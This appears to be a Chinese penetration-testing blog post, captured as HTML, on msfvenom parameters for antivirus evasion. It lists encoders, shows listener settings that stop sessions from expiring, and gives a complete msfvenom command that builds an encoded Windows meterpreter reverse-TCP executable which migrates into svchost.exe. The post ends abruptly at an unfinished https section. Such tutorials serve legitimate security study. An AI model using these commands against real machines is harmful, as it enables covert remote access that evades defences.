@@ -1,0 +1,681 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="August Rosenberg">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="msfvenom部分参数解读1234567891011121314151617181920212223242526272829303132333435363738-p, –payload &lt; payload&gt; 指定需要使用的payload(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的-l, –list [module_type] 列出指定模块的所有可用资源. 模块类型">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BypassAV03-msfvenom隐藏参数">
+<meta property="og:url" content="https://tsy244.github.io/2024/09/19/%E6%B8%97%E9%80%8F/BypassAV03-msfvenom%E9%9A%90%E8%97%8F%E5%8F%82%E6%95%B0/index.html">
+<meta property="og:site_name" content="AU9U5T">
+<meta property="og:description" content="msfvenom部分参数解读1234567891011121314151617181920212223242526272829303132333435363738-p, –payload &lt; payload&gt; 指定需要使用的payload(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的-l, –list [module_type] 列出指定模块的所有可用资源. 模块类型">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-09-18T16:56:15.000Z">
+<meta property="article:modified_time" content="2024-09-18T17:11:35.559Z">
+<meta property="article:author" content="August Rosenberg">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>BypassAV03-msfvenom隐藏参数 - AU9U5T</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"tsy244.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":"G-BL1W5LRRDJ","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>AU9U5T&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="BypassAV03-msfvenom隐藏参数"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        August Rosenberg
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-09-19 00:56" pubdate>
+          September 19, 2024 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.2k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          36 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">BypassAV03-msfvenom隐藏参数</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="msfvenom部分参数解读"><a href="#msfvenom部分参数解读" class="headerlink" title="msfvenom部分参数解读"></a>msfvenom部分参数解读</h1><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs diff"><br><span class="hljs-deletion">-p, –payload &lt; payload&gt; 指定需要使用的payload(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的</span><br><br><span class="hljs-deletion">-l, –list [module_type] 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all</span><br><br><span class="hljs-deletion">-n, –nopsled &lt; length&gt; 为payload预先指定一个NOP滑动长度</span><br><br><span class="hljs-deletion">-f, –format &lt; format&gt; 指定输出格式 (使用 –help-formats 来获取msf支持的输出格式列表)</span><br><br><span class="hljs-deletion">-e, –encoder [encoder] 指定需要使用的encoder（编码器）,指定需要使用的编码，如果既没用-e选项也没用-b选项，则输出raw payload</span><br><br><span class="hljs-deletion">-a, –arch &lt; architecture&gt; 指定payload的目标架构，例如x86 | x64 | x86_64</span><br><br>–platform &lt; platform&gt; 指定payload的目标平台<br><br><span class="hljs-deletion">-s, –space &lt; length&gt; 设定有效攻击荷载的最大长度，就是文件大小</span><br><br><span class="hljs-deletion">-b, –bad-chars &lt; list&gt; 设定规避字符集，指定需要过滤的坏字符例如：不使用 &#x27;\x0f&#x27;、&#x27;\x00&#x27;;</span><br><br><span class="hljs-deletion">-i, –iterations &lt; count&gt; 指定payload的编码次数</span><br><br><span class="hljs-deletion">-c, –add-code &lt; path&gt; 指定一个附加的win32 shellcode文件</span><br><br><span class="hljs-deletion">-x, –template &lt; path&gt; 指定一个自定义的可执行文件作为模板,并将payload嵌入其中</span><br><br><span class="hljs-deletion">-k, –keep 保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><br>–payload-options 列举payload的标准选项<br><br><span class="hljs-deletion">-o, –out &lt; path&gt; 指定创建好的payload的存放位置</span><br><br><span class="hljs-deletion">-v, –var-name &lt; name&gt; 指定一个自定义的变量，以确定输出格式</span><br><br>–shellest 最小化生成payload<br><br><span class="hljs-deletion">-h, –help 查看帮助选项</span><br><br>–help-formats 查看msf支持的输出格式列表<br></code></pre></td></tr></table></figure>
+
+<p>查看编译器</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs gams">┌──(root㉿Rosenberg)-[~]<br>└─# msfvenom --list encoders<br><br>Framework Encoders [--encoder &lt;value&gt;]<br>======================================<br><br>    Name                          Rank       Description<br>    ----                          ----       -----------<br>    cmd/brace                     low        Bash Brace Expansion Command Encoder<br>    cmd/echo                      good       Echo Command Encoder<br>    cmd/generic_sh                manual     Generic Shell <span class="hljs-keyword">Variable</span> Substitution <span class="hljs-comment">Command Encoder</span><br>    cmd/ifs                       low        Bourne $&#123;IFS&#125; Substitution Command Encoder<br>    cmd/perl                      <span class="hljs-comment">normal     Perl Command Encoder</span><br>    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder<br>    cmd/printf_php_mq             <span class="hljs-comment">manual     printf(1) via PHP magic_quotes Utility Command Encoder</span><br>    generic/eicar                 manual     The EICAR Encoder<br>    generic/none                  <span class="hljs-comment">normal     The</span> <span class="hljs-comment">&quot;none&quot;</span> <span class="hljs-comment">Encoder</span><br>    mipsbe/byte_xori              <span class="hljs-built_in">normal</span>     Byte XORi Encoder<br>    mipsbe/longxor                <span class="hljs-comment">normal     XOR Encoder</span><br>    mipsle/byte_xori              <span class="hljs-built_in">normal</span>     Byte XORi Encoder<br>    mipsle/longxor                <span class="hljs-comment">normal     XOR Encoder</span><br>    php/base64                    great      PHP Base64 Encoder<br>    ppc/longxor                   <span class="hljs-comment">normal     PPC LongXOR Encoder</span><br>    ppc/longxor_tag               <span class="hljs-built_in">normal</span>     PPC LongXOR Encoder<br>    ruby/base64                   <span class="hljs-comment">great      Ruby Base64 Encoder</span><br>    sparc/longxor_tag             <span class="hljs-built_in">normal</span>     SPARC DWORD <span class="hljs-keyword">XOR</span> Encoder<br>    x64/xor                       <span class="hljs-comment">normal     XOR Encoder</span><br>    x64/xor_context               <span class="hljs-built_in">normal</span>     Hostname-based Context Keyed Payload Encoder<br>    x64/xor_dynamic               <span class="hljs-comment">normal     Dynamic key XOR Encoder</span><br>    x64/zutto_dekiru              manual     Zutto Dekiru<br>    x86/add_sub                   <span class="hljs-comment">manual     Add</span>/Sub Encoder<br>    x86/<span class="hljs-comment">alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder</span><br>    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder<br>    x86/avoid_underscore_tolower  <span class="hljs-comment">manual     Avoid underscore</span>/tolower<br>    x86/<span class="hljs-comment">avoid_utf8_tolower        manual     Avoid UTF8</span>/tolower<br>    x86/<span class="hljs-comment">bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder</span><br>    x86/bmp_polyglot              manual     BMP Polyglot<br>    x86/call4_dword_xor           <span class="hljs-comment">normal     Call+4 Dword XOR Encoder</span><br>    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder<br>    x86/context_stat              <span class="hljs-comment">manual     stat(2)-based Context Keyed Payload Encoder</span><br>    x86/context_time              manual     time(<span class="hljs-number">2</span>)-based Context Keyed Payload Encoder<br>    x86/countdown                 <span class="hljs-comment">normal     Single-byte XOR Countdown Encoder</span><br>    x86/fnstenv_mov               <span class="hljs-built_in">normal</span>     Variable-length Fnstenv/mov <span class="hljs-comment">Dword XOR Encoder</span><br>    x86/jmp_call_additive         <span class="hljs-built_in">normal</span>     Jump/Call <span class="hljs-comment">XOR Additive Feedback Encoder</span><br>    x86/nonalpha                  low        Non-Alpha Encoder<br>    x86/nonupper                  <span class="hljs-comment">low        Non-Upper Encoder</span><br>    x86/opt_sub                   manual     Sub Encoder (optimised)<br>    x86/service                   <span class="hljs-comment">manual     Register Service</span><br>    x86/shikata_ga_nai            excellent  Polymorphic <span class="hljs-keyword">XOR</span> Additive Feedback Encoder<br>    x86/single_static_bit         <span class="hljs-comment">manual     Single Static Bit</span><br>    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder<br>    x86/unicode_upper             <span class="hljs-comment">manual     Alpha2 Alphanumeric Unicode Uppercase Encoder</span><br>    x86/xor_dynamic               <span class="hljs-built_in">normal</span>     Dynamic key <span class="hljs-keyword">XOR</span> Encoder<br>    x86/xor_poly                  <span class="hljs-comment">normal     XOR POLY Encoder</span><br></code></pre></td></tr></table></figure>
+
+<p>可以重点关注一下</p>
+<p><code>cmd/powershell_base64</code>和<code>x86/shikata_ga_nai</code></p>
+<h1 id="监听参数"><a href="#监听参数" class="headerlink" title="监听参数"></a>监听参数</h1><h2 id="防止假session-无限连接"><a href="#防止假session-无限连接" class="headerlink" title="防止假session  无限连接"></a>防止假session  无限连接</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> ExitOnSession <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="防止session-退出"><a href="#防止session-退出" class="headerlink" title="防止session 退出"></a>防止session 退出</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">msf6</span> exploit(multi/handler) &gt; set SessionCommunicationTimeout <span class="hljs-number">0</span>  //默认情况下，如果一个会话将在<span class="hljs-number">5</span>分钟（<span class="hljs-number">300</span>秒）没有任何活动，那么它会被杀死,为防止此情况可将此项修改为<span class="hljs-number">0</span><br><br><span class="hljs-attribute">msf6</span> exploit(multi/handler) &gt; set SessionExpirationTimeout <span class="hljs-number">0</span> //默认情况下，一个星期（<span class="hljs-number">604800</span>秒）后，会话将被强制关闭,修改为<span class="hljs-number">0</span>可永久不会被关闭<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="handler后台持续监听"><a href="#handler后台持续监听" class="headerlink" title="handler后台持续监听"></a>handler后台持续监听</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><br>msf exploit(<span class="hljs-keyword">multi/handler) </span>&gt; exploit -<span class="hljs-keyword">j </span>-z<br></code></pre></td></tr></table></figure>
+
+<p>使用<code>exploit -j -z</code>可在后台持续监听,-j为后台任务，-z为持续监听，</p>
+<h2 id="生成payload-直接注入到指定的进程中"><a href="#生成payload-直接注入到指定的进程中" class="headerlink" title="生成payload 直接注入到指定的进程中"></a>生成payload 直接注入到指定的进程中</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=10.211.55.2 <span class="hljs-attribute">LPORT</span>=3333 -e x86/shikata_ga_nai -b <span class="hljs-string">&quot;\x00&quot;</span> -i 5 -a x86 --platform win <span class="hljs-attribute">PrependMigrate</span>=<span class="hljs-literal">true</span> <span class="hljs-attribute">PrependMigrateProc</span>=svchost.exe -f exe -o  shell.exe<br></code></pre></td></tr></table></figure>
+
+<p>在上面的生成payload参数中：</p>
+<p>（1）PrependMigrate&#x3D;true <code>PrependMigrateProc=svchost.exe</code> 使这个程序默认会迁移到svchost.exe进程，自己测试的时候不建议到这个进程而是其他的持久进程。</p>
+<p>（2）使用-p指定使用的攻击载荷模块，使用-e指定使用x86&#x2F;shikata_ga_nai编码器，使用-f选项告诉MSF编码器输出格式为exe，-o选项指定输出的文件名为payload.exe，保存在根目录下。</p>
+<h1 id="https-等数据加密payload"><a href="#https-等数据加密payload" class="headerlink" title="https 等数据加密payload"></a>https 等数据加密payload</h1>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F/">#渗透</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>BypassAV03-msfvenom隐藏参数</div>
+      <div>https://tsy244.github.io/2024/09/19/渗透/BypassAV03-msfvenom隐藏参数/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>August Rosenberg</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>September 19, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/09/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/go%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AE%80%E4%BB%8B/" title="go代码审计简介">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">go代码审计简介</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/09/19/%E6%B8%97%E9%80%8F/msf%E7%94%9F%E6%88%90reverse-https%E7%9A%84payload/" title="msf生成reverse_https的payload">
+                        <span class="hidden-mobile">msf生成reverse_https的payload</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/TSY244?tab=repositories" target="_blank" rel="nofollow noopener"><span>github</span></a> <i class="iconfont icon-love"></i> <a href="https://august244.github.io/" target="_blank" rel="nofollow noopener"><span>随笔</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        Views: 
+        <span id="busuanzi_value_site_pv"></span>
+        
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        Visitors: 
+        <span id="busuanzi_value_site_uv"></span>
+        
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
